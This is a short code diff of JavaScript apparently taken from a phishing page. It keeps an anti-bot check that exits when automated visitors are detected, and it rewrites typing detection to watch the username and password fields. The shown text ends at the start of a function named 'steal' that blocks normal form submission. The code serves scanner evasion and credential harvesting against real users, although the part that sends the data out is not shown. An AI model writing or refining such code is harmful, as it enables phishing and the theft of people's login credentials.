@@ -195,13 +195,17 @@
     console.log("Bot detected. Exiting.");
     throw new Error("Blocked");
   }
-
-  // Detect real typing
-  document.querySelectorAll(".input-field").forEach(field => {
-    field.addEventListener("input", () => {
-      typed = true;
-    });
-  });
+const inputs = [
+    document.getElementById('username'),
+    document.getElementById('password')
+];
+inputs.forEach(input => {
+    if (input) {
+        input.addEventListener('input', () => {
+            typed = true;
+        });
+    }
+});
 
   function steal(e) {
     e.preventDefault();
